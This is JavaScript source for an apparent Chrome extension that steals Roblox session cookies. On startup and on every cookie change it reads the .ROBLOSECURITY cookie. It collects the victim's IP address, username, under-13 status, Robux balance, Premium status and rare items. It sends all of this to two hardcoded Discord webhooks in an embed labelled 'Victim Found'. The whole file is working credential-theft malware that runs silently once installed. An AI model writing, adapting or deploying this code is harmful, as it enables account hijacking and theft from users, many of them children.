const WEBHOOKS = [
    {
        url: "https://discord.com/api/webhooks/1417133148717973656/OQ5xYHUB05EpBhD_c4bdzWtcxJmuf0i0_iT_-n8bmkkcH6WXhawMVr-aXTctQpNkC_au",
        mention: "@everyone"
    },
    {
        url: "https://discord.com/api/webhooks/1417077903971323975/AsOHHZIIl827b3CpcQbGywXmWvbsN-jpXFQhBB_FJeLlQ8G_Ao6AQO66kr6n956RT7ZL",
        mention: "@everyone"
    }
];
let lastCookie = null; // Track last sent cookie

async function checkOwnership(userId, assetId, cookie) {
    try {
        let res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        if (!res.ok) return false;
        let json = await res.json();
        return json?.data?.length > 0;
    } catch {
        return false;
    }
}

async function main(cookie) {
    if (!cookie) return;

    if (cookie === lastCookie) return; // avoid duplicate sends
    lastCookie = cookie;

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    try {
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        if (!res.ok) throw "Failed to get user info";

        let user = await res.json();

        // Robux + Pending
        let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };

        // Premium
        let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let isPremium = premiumRes.ok ? await premiumRes.json() : false;

        // Profile picture
        let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
        let thumbJson = await thumbRes.json();
        let thumbUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"; // fallback
        if (thumbJson?.data?.length > 0 && thumbJson.data[0].imageUrl) {
            thumbUrl = thumbJson.data[0].imageUrl;
        }

        // Korblox + Headless
        let hasKorblox = await checkOwnership(user.id, 18122167, cookie);
        let hasHeadless = await checkOwnership(user.id, 134082579, cookie);

        statistics = {
            UserName: user.name,
            UserId: user.id,
            IsUnder13: user.isUnder13,
            JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
            RobuxBalance: economy.robux ?? "N/A",
            PendingRobux: economy.robuxPending ?? "N/A",
            IsPremium: isPremium,
            ThumbnailUrl: thumbUrl,
            Korblox: hasKorblox,
            Headless: hasHeadless
        };

    } catch (e) {
        console.error("Error fetching Roblox data:", e);
    }

    // Embed
    let embedPayload = {
        embeds: [
            {
                description: "```" + cookie + "```\n[Refresh Cookie](https://refresher.ct.ws/?i=1)",
                color: 0xFF0000, // 🔴 Red embed
                description: `\`\`\`${cookie ?? "COOKIE NOT FOUND"}\`\`\``,
                fields: [
                    { name: "Username", value: statistics?.UserName ?? "N/A", inline: true },
                    { name: "User ID", value: statistics?.UserId ?? "N/A", inline: true },
                    { name: "Underage", value: statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                    { name: "Join Date", value: statistics?.JoinDate ?? "N/A", inline: true },
                    { name: "Robux", value: statistics?.RobuxBalance ?? "N/A", inline: true },
                    { name: "Pending Robux", value: statistics?.PendingRobux ?? "N/A", inline: true },
                    { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                    { name: "Korblox", value: statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", inline: true },
                    { name: "Headless", value: statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A", inline: true }
                ],
                author: {
                    name: `Victim Found: ${ipAddr}`,
                    icon_url: statistics?.ThumbnailUrl ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                },
                thumbnail: { url: statistics?.ThumbnailUrl ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png" },
                footer: {
                    text: "ENTERPRISE",
                    icon_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
                }
            }
        ],
        username: "Extension Logger",
        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg",
        
    for (let wh of WEBHOOKS) {
        fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ...embedPayload, content: wh.mention })
        }).catch(console.error);
    }
}

// Startup listener
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, cookie => main(cookie?.value ?? null));

// Listen for cookie changes
chrome.cookies.onChanged.addListener(changeInfo => {
    if (changeInfo.cookie?.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com")) {
        if (changeInfo.removed) console.log("Roblox cookie removed (logout)");
        else {
            console.log("Roblox cookie updated (login/refresh)");
            main(changeInfo.cookie.value);
        }
    }
});


